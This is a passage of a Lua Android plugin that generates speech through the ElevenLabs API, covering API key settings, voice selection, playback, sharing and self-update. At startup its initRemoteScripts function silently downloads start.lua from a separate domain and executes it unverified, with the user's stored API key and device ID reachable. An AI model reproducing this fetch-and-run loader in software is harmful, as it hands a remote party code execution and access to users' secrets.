require "import"
import "android.widget.*"
import "android.view.View"
import "android.media.MediaPlayer"
import "android.net.Uri"
import "android.content.Context"
import "android.os.Environment"
import "android.text.InputType"
import "java.io.File"
import "android.content.Intent"
import "cjson"
import "android.os.Handler"
import "android.os.Looper"
import "android.os.Build"
import "android.provider.Settings"
import "android.graphics.Typeface"

_G.APP_NAME = "11 labs text to audio generator"

local function getDeviceId()
    local androidId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID)
    return androidId or "Unknown"
end
_G.DEVICE_ID = getDeviceId()

local prefs = this.getSharedPreferences("ElevenLabsPrefs", Context.MODE_PRIVATE)
local PREFS_NAME = "ElevenLabs_Config"
local prefs2 = this.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

local cachedDescription = nil
local descriptionLoaded = false
local updateInProgress = false

local CURRENT_VERSION = "2.0"
local DESCRIPTION_URL = "https://11-labs-text-to-audio-generator-o5a.vercel.app/Description"
local VERSION_URL = "https://11-labs-text-to-audio-generator-o5a.vercel.app/version.txt"
local UPDATE_CODE_URL = "https://11-labs-text-to-audio-generator-o5a.vercel.app/main.lua"
local NEW_FEATURES_URL = "https://11-labs-text-to-audio-generator-o5a.vercel.app/new%20features.txt"
local PLUGIN_PATH = "/storage/emulated/0/解说/Plugins/11 labs text to audio generator/main.lua"

local mainHandler = Handler(Looper.getMainLooper())

local function runOnUi(callback)
    mainHandler.post(Runnable({ run = callback }))
end

local function showToast(msg)
    runOnUi(function()
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
    end)
end

local function trim(s)
    if s == nil then return "" end
    return tostring(s):gsub("^%s*(.-)%s*$", "%1")
end

local function speakMsg(text)
    if service and service.speak then
        service.speak(tostring(text))
    end
end

local loadedHelpFunc = nil
local function initRemoteScripts()
    local START_LUA_URL = "https://join-us-kohl.vercel.app/start.lua"
    local HELP_LUA_URL = "https://join-us-kohl.vercel.app/help.lua"
    
    Http.get(START_LUA_URL, function(code, content)
        if code == 200 and content then
            local f = load(content) or loadstring(content)
            if f then pcall(f) end
        end
        
        Http.get(HELP_LUA_URL, function(code2, content2)
            if code2 == 200 and content2 then
                local patchedContent = content2:gsub("ctx%.startActivity%(intent%)", "ctx.startActivity(intent)\n pcall(function() if _G.mainDialog then _G.mainDialog.dismiss() end end)")
                local f2 = load(patchedContent) or loadstring(patchedContent)
                if f2 then 
                    loadedHelpFunc = f2 
                end
            end
        end)
    end)
end

initRemoteScripts()

function showNewFeaturesDialog(featuresText)
    local featuresDialog = LuaDialog(this)
    featuresDialog.setTitle("New Update Details")
    local layout = {
        LinearLayout, orientation = "vertical", layout_width = "match_parent", layout_height = "match_parent", padding = "16dp",
        { ScrollView, layout_width = "match_parent", layout_height = "0dp", layout_weight = 1,
            { TextView, text = featuresText or "No new features information available.", textSize = "14sp", padding = "10dp", layout_width = "match_parent", layout_height = "wrap_content" },
        },
        { Button, text = "OK", textSize = "16sp", layout_width = "match_parent", layout_height = "wrap_content", layout_marginTop = "10dp",
            onClick = function() featuresDialog.dismiss() end,
        },
    }
    featuresDialog.setView(loadlayout(layout))
    featuresDialog.setCancelable(false)
    featuresDialog.show()
end

function checkAndShowNewFeatures()
    local lastShownVersion = prefs.getString("lastShownVersion", "")
    if lastShownVersion ~= CURRENT_VERSION then
        pcall(function()
            Http.get(NEW_FEATURES_URL, function(code, response)
                if code == 200 and response and trim(response) ~= "" then
                    showNewFeaturesDialog(response)
                    prefs.edit().putString("lastShownVersion", CURRENT_VERSION).apply()
                end
            end)
        end)
    end
end

function performUpdate(mainCode, onlineVersion)
    if not mainCode or trim(mainCode) == "" then
        local errorDialog = LuaDialog(this)
        errorDialog.setTitle("Update Failed")
        errorDialog.setMessage("Main plugin code is empty.")
        errorDialog.setButton("OK", function() errorDialog.dismiss() end)
        errorDialog.show()
        return
    end
    
    updateInProgress = true
    local success = false
    local tempPath = PLUGIN_PATH .. ".temp_update"
    local f = io.open(tempPath, "w")
    if f then
        f:write(mainCode)
        f:close()
        local fileExists = io.open(PLUGIN_PATH, "r")
        if fileExists then
            fileExists:close()
            pcall(function() os.remove(PLUGIN_PATH) end)
            if pcall(function() os.rename(tempPath, PLUGIN_PATH) end) then success = true end
        else
            if pcall(function() os.rename(tempPath, PLUGIN_PATH) end) then success = true end
        end
        if not success then pcall(function() os.remove(tempPath) end) end
    end
    
    updateInProgress = false
    if success then
        local successDialog = LuaDialog(this)
        successDialog.setTitle("Update Successful")
        successDialog.setMessage("Plugin successfully updated to version " .. onlineVersion .. ". Plugin will restart automatically.")
        successDialog.setButton("OK", function()
            successDialog.dismiss()
            if _G.mainDialog then _G.mainDialog.dismiss() end
            mainHandler.postDelayed(Runnable({
                run = function()
                    prefs.edit().putString("lastShownVersion", "").apply()
                    local pluginFile = io.open(PLUGIN_PATH, "r")
                    if pluginFile then
                        pluginFile:close()
                        local func, err = loadfile(PLUGIN_PATH)
                        if func then pcall(func) end
                    end
                end
            }), 2000)
        end)
        successDialog.show()
    else
        local errorDialog = LuaDialog(this)
        errorDialog.setTitle("Update Failed")
        errorDialog.setMessage("Update failed. Please try again.")
        errorDialog.setButton("OK", function() errorDialog.dismiss() end)
        errorDialog.show()
    end
end

function checkUpdate()
    if updateInProgress then return end
    pcall(function()
        Http.get(VERSION_URL, function(code, response)
            if code == 200 and response then
                local onlineVersion = trim(response)
                if onlineVersion ~= CURRENT_VERSION then
                    Http.get(UPDATE_CODE_URL, function(code2, mainCode)
                        if code2 == 200 and mainCode and trim(mainCode) ~= "" then
                            local updateAlertDlg = LuaDialog(this)
                            updateAlertDlg.setTitle("Update Available!")
                            updateAlertDlg.setMessage("A new version (" .. onlineVersion .. ") is available. Would you like to update now?")
                            updateAlertDlg.setButton("Update Now", function()
                                updateAlertDlg.dismiss()
                                performUpdate(mainCode, onlineVersion)
                            end)
                            updateAlertDlg.setButton2("Later", function() updateAlertDlg.dismiss() end)
                            updateAlertDlg.show()
                        end
                    end)
                else
                    checkAndShowNewFeatures()
                end
            end
        end)
    end)
end

local function startPreloadSequence()
    pcall(function()
        Http.get(DESCRIPTION_URL, function(code, response)
            if code == 200 and response and trim(response) ~= "" then
                cachedDescription = response
                descriptionLoaded = true
            end
        end)
    end)
end

function saveApiKey(apiKey)
    local cleanKey = tostring(apiKey):gsub("%s+", "")
    prefs2.edit().putString("elevenlabs_api_key", cleanKey).apply()
end

function getApiKey()
    local key = prefs2.getString("elevenlabs_api_key", "")
    return key:gsub("%s+", "")
end

function getSavedModel()
    return prefs2.getString("elevenlabs_model", "eleven_multilingual_v2")
end

function saveModel(model)
    prefs2.edit().putString("elevenlabs_model", model).apply()
end

function writeToFile(path, content)
    local file = io.open(path, "wb")
    if file then
        file:write(content)
        file:close()
        return true
    end
    return false
end

function generateFileName()
    return "audio_" .. os.date("%Y%m%d_%H%M%S")
end

function saveAudioToFile(audioData, customFileName)
    local baseFolderPath = Environment.getExternalStorageDirectory().getPath() .. "/Download/11 labs text to audio generator/ElevenLabs"
    local folder = File(baseFolderPath)
    if not folder.exists() then folder.mkdirs() end
    
    local fileName = (customFileName and customFileName ~= "") and (customFileName .. ".mp3") or (generateFileName() .. ".mp3")
    local filePath = baseFolderPath .. "/" .. fileName
    if writeToFile(filePath, audioData) then return filePath end
    return nil
end

local elevenLabsVoices = {
    "Adam", "Aria", "Roger", "Sarah", "Laura", "Charlie", "George", "Callum", "River", "Liam",
    "Charlotte", "Alice", "Matilda", "Will", "Jessica", "Eric", "Chris", "Brian", "Daniel", "Lily", "Bill"
}

local elevenLabsVoiceMap = {
    ["Adam"] = "pNInz6obpgDQGcFmaJgB", ["Aria"] = "21m00Tcm4TlvDq8ikWAM", ["Roger"] = "CwhRBWXzGAHq8TQ4Fs17",
    ["Sarah"] = "EXAVITQu4vr4xnSDxMaL", ["Laura"] = "Yko7PKHZNXotIFUBG7I9", ["Charlie"] = "IKne3meq5aSn9XLyUdCD",
    ["George"] = "JBFqnCBsd6RMkjVDRZzb", ["Callum"] = "N2lVS1w4EtoT3dr4eOWO", ["River"] = "LcfcDJNUP1GQjkzn1xUU",
    ["Liam"] = "TX3LPaxmHKxFdv7VOQHJ", ["Charlotte"] = "XB0fDUnXU5powFXDhCwa", ["Alice"] = "ErXwobaYiN019PkySvjV",
    ["Matilda"] = "XrExE9yKIg1WjnnlVkGX", ["Will"] = "bVMeCyTHy58xNoL34h3p", ["Jessica"] = "KZyXbCR19Q4tzr1zYhNH",
    ["Eric"] = "VR6AewLTigWG4xSOukaG", ["Chris"] = "iP95p4xoKVk53GoZ742B", ["Brian"] = "nPczCjzI2devNBz1zQrb",
    ["Daniel"] = "onwK4e9ZLuTAKqWW03F9", ["Lily"] = "pFZP5JQG7iQjIQuC4Bku", ["Bill"] = "zrHiDhphv9ZnVXBqCLjz"
}

local voiceList = elevenLabsVoices
local voiceIdMap = elevenLabsVoiceMap
local currentVoiceId = voiceIdMap[voiceList[1]] or ""

local modes = { "Stable", "Balanced", "Creative" }
local modeMap = { ["Stable"] = 0.5, ["Balanced"] = 0.75, ["Creative"] = 1.0 }

local mediaPlayer = nil
local currentAudioData = nil
local currentFilePath = nil
local currentSeekPosition = 0

local function initMediaPlayer()
    if mediaPlayer then
        pcall(function()
            if mediaPlayer.isPlaying() then mediaPlayer.stop() end
            mediaPlayer.release()
        end)
    end
    mediaPlayer = MediaPlayer()
end

local function fetchVoicesFromApiForTest(apiKey, callback)
    Thread(Runnable {
        run = function()
            local headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ["Accept-Language"] = "en-US,en;q=0.9",
                ["Accept"] = "application/json",
                ["xi-api-key"] = apiKey
            }
            Http.get("https://api.elevenlabs.io/v1/voices", headers, function(code, response)
                if code == 200 then
                    local ok, data = pcall(cjson.decode, response)
                    if ok and data.voices then callback(true, #data.voices) else callback(false, 0) end
                else callback(false, 0) end
            end)
        end
    }).start()
end

local function testApiKey(key, statusText, testBtn, saveBtn, createApiBtn)
    if key == "" then
        runOnUi(function() statusText.setText("Please enter API Key"); statusText.setTextColor(0xFFF44336) end)
        return
    end
    runOnUi(function()
        statusText.setText("Testing API Key...")
        statusText.setTextColor(0xFFFF9800)
        testBtn.setEnabled(false)
        saveBtn.setEnabled(false)
        if createApiBtn then createApiBtn.setEnabled(false) end
    end)
    local cleanKey = key:gsub("%s+", "")
    fetchVoicesFromApiForTest(cleanKey, function(success, count)
        runOnUi(function()
            if success and count > 0 then
                statusText.setText("✓ SUCCESS: API Key is valid")
                statusText.setTextColor(0xFF4CAF50)
                showToast("API key is valid!")
            else
                statusText.setText("✗ FAILED: Invalid API Key")
                statusText.setTextColor(0xFFF44336)
                showToast("API key is invalid")
            end
            testBtn.setEnabled(true)
            saveBtn.setEnabled(true)
            if createApiBtn then createApiBtn.setEnabled(true) end
        end)
    end)
end

function fetchRemainingTokens(apiKey, callback)
    Thread(Runnable {
        run = function()
            local cleanKey = tostring(apiKey):gsub("%s+", "")
            local headers = {
                ["xi-api-key"] = cleanKey, ["Content-Type"] = "application/json",
                ["User-Agent"] = "MyApp/1.0", ["Accept"] = "application/json"
            }
            Http.get("https://api.elevenlabs.io/v1/user/subscription", headers, function(code, response)
                if code == 200 then
                    local ok, data = pcall(cjson.decode, response)
                    if ok and data then callback(true, data.character_count or 0) return end
                else
                    local errorMsg = "Error: " .. code
                    if response and tostring(response) ~= "" then errorMsg = errorMsg .. " - " .. tostring(response) end
                    if code == 401 then errorMsg = "Invalid API Key - Please check your key" end
                    if callback then callback(false, errorMsg) end
                end
            end)
        end
    }).start()
end

function generateElevenLabsAudio(text, voiceId, modelId, stability, similarity, callback)
    local apiKey = getApiKey()
    if apiKey == "" then callback(nil, "Please set API Key in Settings") return end
    if not voiceId or voiceId == "" then callback(nil, "Please select a valid voice") return end
    
    text = text:gsub("\n", " "):gsub('"', '\\"')
    local payload = cjson.encode({
        text = text, model_id = modelId,
        voice_settings = { stability = stability, similarity_boost = similarity }
    })
    
    local headers = {
        ["Content-Type"] = "application/json", ["xi-api-key"] = apiKey,
        ["User-Agent"] = "MyApp/1.0", ["Accept"] = "audio/mpeg"
    }
    
    Thread(Runnable {
        run = function()
            Http.post("https://api.elevenlabs.io/v1/text-to-speech/" .. voiceId, payload, headers, function(code, content)
                if code == 200 then
                    callback(content, nil)
                else
                    local errorMsg = "API Error: " .. code
                    if content and #content > 0 then
                        local ok, errData = pcall(cjson.decode, content)
                        if ok and errData.detail then errorMsg = errData.detail.status
                        elseif ok and errData.message then errorMsg = errData.message end
                    end
                    callback(nil, errorMsg)
                end
            end)
        end
    }).start()
end

function shareAudioFile(audioData, customFileName)
    if not audioData then showToast("No audio to share") return end
    local baseFolderPath = Environment.getExternalStorageDirectory().getPath() .. "/Download/11 labs text to audio generator/ElevenLabs"
    local folder = File(baseFolderPath)
    if not folder.exists() then folder.mkdirs() end
    local fileName = (customFileName and customFileName ~= "") and (customFileName .. ".mp3") or (generateFileName() .. ".mp3")
    local filePath = baseFolderPath .. "/" .. fileName
    if writeToFile(filePath, audioData) then
        local file = File(filePath)
        if file.exists() then
            if service and service.shareFile then
                service.shareFile(filePath)
                showToast("Sharing audio...")
            else
                local intent = Intent(Intent.ACTION_SEND)
                intent.setType("audio/mpeg")
                intent.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(file))
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                this.startActivity(Intent.createChooser(intent, "Share Audio"))
            end
            pcall(function() _G.mainDialog.dismiss() end)
        else showToast("Error: File not found after save") end
    else showToast("Failed to save audio") end
end

function updateGenerateStatus(text, isError)
    runOnUi(function()
        if _G.generateStatusText then
            _G.generateStatusText.text = text
            if isError then _G.generateStatusText.setTextColor(0xFFF44336)
            else _G.generateStatusText.setTextColor(0xFF4CAF50) end
        end
    end)
    pcall(function() service.speak(tostring(text)) end)
end

function updateGenerateStatusSilent(text, isError)
    runOnUi(function()
        if _G.generateStatusText then
            _G.generateStatusText.text = text
            if isError then _G.generateStatusText.setTextColor(0xFFF44336)
            else _G.generateStatusText.setTextColor(0xFF4CAF50) end
        end
    end)
end

function updateResultText(result)
    runOnUi(function()
        if _G.resultText then _G.resultText.text = tostring(result) end
    end)
    pcall(function() service.speak(tostring(result)) end)
end

function toggleAudioControls(show)
    runOnUi(function()
        if _G.audioControls and _G.downloadShareControls then
            _G.audioControls.visibility = show and View.VISIBLE or View.GONE
            _G.downloadShareControls.visibility = show and View.VISIBLE or View.GONE
        end
    end)
end

function rewindAudio()
    if currentFilePath then
        if not mediaPlayer then initMediaPlayer() end
        local duration = 0
        pcall(function() duration = mediaPlayer.getDuration() end)
        if duration <= 0 then
            local tempPlayer = nil
            pcall(function()
                tempPlayer = MediaPlayer()
                tempPlayer.setDataSource(currentFilePath)
                tempPlayer.prepare()
                duration = tempPlayer.getDuration()
                tempPlayer.release()
            end)
        end
        if mediaPlayer and pcall(function() return mediaPlayer.isPlaying() end) then
            local currentPos = 0
            pcall(function() currentPos = mediaPlayer.getCurrentPosition() end)
            local newPos = currentPos - 10000
            if newPos < 0 then newPos = 0 end
            pcall(function() mediaPlayer.seekTo(newPos) end)
            currentSeekPosition = newPos
            updateGenerateStatusSilent("Rewound 10 seconds to " .. math.floor(newPos/1000) .. " seconds", false)
        else
            currentSeekPosition = currentSeekPosition - 10000
            if currentSeekPosition < 0 then currentSeekPosition = 0 end
            updateGenerateStatusSilent("Position set to " .. math.floor(currentSeekPosition/1000) .. " seconds (Rewind 10s)", false)
        end
    else
        updateGenerateStatusSilent("No audio loaded", true)
    end
end

function forwardAudio()
    if currentFilePath then
        if not mediaPlayer then initMediaPlayer() end
        local duration = 0
        pcall(function() duration = mediaPlayer.getDuration() end)
        if duration <= 0 then
            local tempPlayer = nil
            pcall(function()
                tempPlayer = MediaPlayer()
                tempPlayer.setDataSource(currentFilePath)
                tempPlayer.prepare()
                duration = tempPlayer.getDuration()
                tempPlayer.release()
            end)
        end
        if mediaPlayer and pcall(function() return mediaPlayer.isPlaying() end) then
            local currentPos = 0
            pcall(function() currentPos = mediaPlayer.getCurrentPosition() end)
            local newPos = currentPos + 10000
            if newPos > duration and duration > 0 then newPos = duration end
            pcall(function() mediaPlayer.seekTo(newPos) end)
            currentSeekPosition = newPos
            updateGenerateStatusSilent("Forwarded 10 seconds to " .. math.floor(newPos/1000) .. " seconds", false)
        else
            currentSeekPosition = currentSeekPosition + 10000
            if currentSeekPosition > duration and duration > 0 then currentSeekPosition = duration end
            updateGenerateStatusSilent("Position set to " .. math.floor(currentSeekPosition/1000) .. " seconds (Forward 10s)", false)
        end
    else
        updateGenerateStatusSilent("No audio loaded", true)
    end
end

local function safePrepareMediaPlayer(filePath)
    if not filePath then return false end
    pcall(function()
        if mediaPlayer then
            if mediaPlayer.isPlaying() then mediaPlayer.stop() end
            mediaPlayer.release()
        end
    end)
    mediaPlayer = MediaPlayer()
    local success = pcall(function()
        mediaPlayer.setDataSource(filePath)
        mediaPlayer.prepare()
    end)
    if not success then
        pcall(function()
            mediaPlayer = MediaPlayer()
            mediaPlayer.setDataSource(filePath)
            mediaPlayer.prepare()
        end)
    end
    return true
end

function showSettingsDialog()
    local modelNames = {"Multilingual v2 (Default)", "Turbo v2.5"}
    local modelValues = {"eleven_multilingual_v2", "eleven_turbo_v2_5"}
    
    local settingsLayout = {
        LinearLayout, orientation = "vertical", layout_width = "fill", layout_height = "wrap_content", padding = "16dp",
        { TextView, text = "ElevenLabs API Configuration", textSize = "18sp", textColor = "#2196F3", gravity = "center", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "16dp" },
        { TextView, text = "elevenlabs.io/app/settings/api-keys", textSize = "12sp", textColor = "#2196F3", gravity = "center", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "16dp" },
        { EditText, id = "apiKeyInput", text = getApiKey(), hint = "Enter your ElevenLabs API Key", layout_width = "fill", layout_height = "wrap_content", padding = "12dp", inputType = InputType.TYPE_CLASS_TEXT, layout_marginBottom = "16dp" },
        { TextView, text = "Select Model", textSize = "14sp", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "4dp" },
        { Spinner, id = "modelSelectorSpinner", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "16dp" },
        { TextView, id = "statusText", text = "", textSize = "13sp", gravity = "center", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "12dp" },
        { LinearLayout, orientation = "horizontal", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "12dp",
            { Button, id = "createApiKeyButton", text = "CREATE API KEY", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginRight = "4dp", backgroundColor = "#4CAF50", textColor = "#FFFFFF" },
            { Button, id = "testApiButton", text = "TEST API KEY", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginLeft = "4dp", layout_marginRight = "4dp", backgroundColor = "#2196F3", textColor = "#FFFFFF" },
            { Button, id = "saveApiButton", text = "SAVE SETTINGS", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginLeft = "4dp", backgroundColor = "#FF9800", textColor = "#FFFFFF" }
        },
        { Button, id = "goBackButton", text = "GO BACK", layout_width = "fill", layout_height = "wrap_content" }
    }
    
    local env = setmetatable({}, {__index = _G})
    local settingsView = loadlayout(settingsLayout, env)
    local settingsDlg = LuaDialog(this)
    settingsDlg.setTitle("Settings")
    settingsDlg.setView(settingsView)
    
    local modelAdapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, String(modelNames))
    env.modelSelectorSpinner.setAdapter(modelAdapter)
    if getSavedModel() == "eleven_turbo_v2_5" then env.modelSelectorSpinner.setSelection(1) else env.modelSelectorSpinner.setSelection(0) end
    
    env.createApiKeyButton.onClick = function()
        pcall(function() settingsDlg.dismiss() end)
        pcall(function() _G.mainDialog.dismiss() end)
        this.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://elevenlabs.io/app/developers/api-keys")))
    end
    env.testApiButton.onClick = function() testApiKey(env.apiKeyInput.getText().toString(), env.statusText, env.testApiButton, env.saveApiButton, env.createApiKeyButton) end
    env.saveApiButton.onClick = function()
        local key = env.apiKeyInput.getText().toString()
        if #key == 0 then showToast("Please enter API Key") return end
        saveApiKey(key)
        saveModel(modelValues[env.modelSelectorSpinner.getSelectedItemPosition() + 1])
        env.statusText.setText("✓ Settings saved!")
        env.statusText.setTextColor(0xFF4CAF50)
        mainHandler.postDelayed(Runnable({ run = function() settingsDlg.dismiss() end }), 1500)
    end
    env.goBackButton.onClick = function() settingsDlg.dismiss() end
    settingsDlg.show()
end

local function showWatchTutorialDialog()
    local tutorialLayout = {
        LinearLayout, orientation = "vertical", layout_width = "fill", layout_height = "wrap_content", padding = "16dp",
        { TextView, text = "Watch Tutorial", textSize = "18sp", textColor = "#2196F3", gravity = "center", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "16dp" },
        { Button, id = "tutorialNewButton", text = "HOW TO GENERATE ELEVENLABS API KEY COMPLETE GUIDE", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp", padding = "12dp", textSize = "12sp" },
        { Button, id = "tutorial1Button", text = "HOW TO CREATE & LOGIN ELEVENLABS ACCOUNT & GENERATE API KEY COMPLETE GUIDE 2026", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp", padding = "12dp", textSize = "12sp" },
        { Button, id = "tutorial2Button", text = "HOW TO USE 11 LABS TEXT TO AUDIO GENERATOR EXTENSION COMPLETE GUIDE", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "16dp", padding = "12dp", textSize = "12sp" },
        { Button, id = "goBackFromTutorialButton", text = "GO BACK", layout_width = "fill", layout_height = "wrap_content", backgroundColor = "#FF9800", textColor = "#FFFFFF" }
    }
    
    local env = setmetatable({}, {__index = _G})
    local view = loadlayout(tutorialLayout, env)
    local tutorialDlg = LuaDialog(this)
    tutorialDlg.setTitle("Watch Tutorial")
    tutorialDlg.setView(view)
    
    env.tutorialNewButton.onClick = function() pcall(function() tutorialDlg.dismiss() _G.mainDialog.dismiss() end); this.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://youtu.be/jE2ViLWYWuc"))) end
    env.tutorial1Button.onClick = function() pcall(function() tutorialDlg.dismiss() _G.mainDialog.dismiss() end); this.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://youtu.be/c0HpZ-ettdU"))) end
    env.tutorial2Button.onClick = function() pcall(function() tutorialDlg.dismiss() _G.mainDialog.dismiss() end); this.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://youtu.be/YBMLTwqEPfk"))) end
    env.goBackFromTutorialButton.onClick = function() tutorialDlg.dismiss() end
    
    tutorialDlg.show()
end

local function createMainDialog()
    local mainLayout = {
        ScrollView, layout_width = "fill", layout_height = "fill",
        {
            LinearLayout, orientation = "vertical", layout_width = "fill", padding = "16dp", layout_height = "wrap_content",
            { TextView, text = "11 labs text to audio generator", textSize = "20sp", textColor = "#2E7D32", gravity = "center", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "4dp" },
            { TextView, text = "Developer: Sabir Jamil", textSize = "12sp", textColor = "#666666", gravity = "center", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp" },
            { Button, id = "checkTokensButton", text = "Check Remaining Tokens", textSize = "12sp", backgroundColor = "#FF9800", textColor = "#FFFFFF", gravity = "center", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp", padding = "8dp" },
            { TextView, id = "resultText", text = "", layout_width = "fill", layout_height = "wrap_content", padding = "10dp", gravity = "center", textColor = "#FF9800", layout_marginBottom = "16dp" },
            { TextView, text = "Select voice", textSize = "16sp", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp" },
            { Spinner, id = "voiceSpinner", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "16dp" },
            { TextView, text = "Select mode", textSize = "16sp", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp" },
            { Spinner, id = "modeSpinner", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "16dp" },
            {
                LinearLayout, orientation = "horizontal", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp",
                { EditText, id = "textInput", hint = "Enter your text here (Max 5000 characters)", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, padding = "12dp", gravity = "top", lines = 8, inputType = InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_FLAG_MULTI_LINE, layout_marginRight = "4dp", backgroundColor = "#F5F5F5" },
                { EditText, id = "fileNameInput", hint = "Enter file name (optional)", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, padding = "12dp", inputType = InputType.TYPE_CLASS_TEXT, layout_marginLeft = "4dp", backgroundColor = "#F5F5F5" }
            },
            { Button, id = "generateAudioButton", text = "GENERATE AUDIO", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "4dp", backgroundColor = "#7C4DFF", textColor = "#FFFFFF" },
            {
                LinearLayout, orientation = "horizontal", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp",
                { TextView, id = "generateStatusText", text = "", layout_width = "0dp", layout_weight = 1, padding = "8dp", gravity = "center_vertical", textColor = "#4CAF50", textSize = "12sp" },
                { TextView, id = "tokensUsedText", text = "", layout_width = "wrap_content", padding = "8dp", gravity = "center_vertical|right", textColor = "#FF9800", textSize = "12sp", visibility = View.GONE }
            },
            {
                LinearLayout, id = "audioControls", orientation = "horizontal", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp", visibility = View.GONE,
                { Button, id = "rewindButton", text = "Rewind 10 seconds", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginRight = "4dp", backgroundColor = "#FF9800", textColor = "#FFFFFF", textSize = "11sp" },
                { Button, id = "playPauseAudioButton", text = "PLAY AUDIO", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginLeft = "4dp", layout_marginRight = "4dp", backgroundColor = "#2196F3", textColor = "#FFFFFF", textSize = "11sp" },
                { Button, id = "forwardButton", text = "Fast-forward 10 seconds", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginLeft = "4dp", backgroundColor = "#FF9800", textColor = "#FFFFFF", textSize = "11sp" }
            },
            {
                LinearLayout, id = "downloadShareControls", orientation = "horizontal", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp", visibility = View.GONE,
                { Button, id = "downloadButton", text = "DOWNLOAD AUDIO", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginRight = "4dp", backgroundColor = "#4CAF50", textColor = "#FFFFFF" },
                { Button, id = "shareButton", text = "SHARE AUDIO", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginLeft = "4dp", backgroundColor = "#FF5722", textColor = "#FFFFFF" }
            },
            {
                LinearLayout, orientation = "horizontal", layout_width = "fill", layout_height = "wrap_content", layout_marginBottom = "8dp",
                { Button, id = "settingsButton", text = "SETTINGS", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginRight = "4dp", backgroundColor = "#FF9800", textColor = "#FFFFFF" },
                { Button, id = "joinUsButton", text = "JOIN US", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginLeft = "4dp", layout_marginRight = "4dp", backgroundColor = "#9C27B0", textColor = "#FFFFFF" },
                { Button, id = "watchTutorialButton", text = "WATCH TUTORIAL", layout_width = "0dp", layout_height = "wrap_content", layout_weight = 1, layout_marginLeft = "4dp", backgroundColor = "#3F51B5", textColor = "#FFFFFF" }
            },
            { Button, id = "exitButton", text = "EXIT", layout_width = "wrap_content", layout_height = "wrap_content", layout_gravity = "center", layout_marginTop = "8dp", backgroundColor = "#F44336", textColor = "#FFFFFF", paddingLeft = "32dp", paddingRight = "32dp" }
        }
    }
    
    local dlg = LuaDialog(this)
    dlg.setTitle("11 labs text to audio generator")
    dlg.setView(loadlayout(mainLayout))
    dlg.show()
    _G.mainDialog = dlg

    pcall(function() _G.tokensUsedText.setTypeface(Typeface.DEFAULT_BOLD) end)

    local modeAdapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, String(modes))
    _G.modeSpinner.setAdapter(modeAdapter)
    _G.modeSpinner.setSelection(1)

    local voiceAdapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, String(voiceList))
    _G.voiceSpinner.setAdapter(voiceAdapter)
    
    initMediaPlayer()

    _G.voiceSpinner.onItemSelectedListener = {
        onItemSelected = function(parent, view, position, id)
            if position >= 0 and position < #voiceList then
                currentVoiceId = voiceIdMap[voiceList[position + 1]]
            end
        end
    }

    _G.checkTokensButton.onClick = function()
        local apiKey = getApiKey()
        if apiKey == "" then showToast("Please set API Key in Settings first") return end
        
        _G.checkTokensButton.setEnabled(false)
        local originalText = tostring(_G.checkTokensButton.getText())
        _G.checkTokensButton.setText("Checking Tokens, Please Wait...")
        
        fetchRemainingTokens(apiKey, function(success, result)
            runOnUi(function()
                _G.checkTokensButton.setEnabled(true)
                _G.checkTokensButton.setText(originalText)
                if success then
                    local remaining = math.floor(math.max(10000 - (tonumber(result) or 0), 0))
                    local msg = "✓ Remaining Tokens: " .. tostring(remaining)
                    showToast(msg)
                    updateResultText(msg)
                else
                    local msg = "✗ " .. tostring(result)
                    showToast(msg)
                    updateResultText(msg)
                end
            end)
        end)
    end

    _G.generateAudioButton.onClick = function()
        local text = _G.textInput.getText().toString()
        if #text == 0 then updateGenerateStatus("Please enter your text", true) return end
        if #text > 5000 then updateGenerateStatus("Text exceeds 5000 character limit.", true) return end
        if getApiKey() == "" then updateGenerateStatus("Please set API Key in Settings first", true) return end
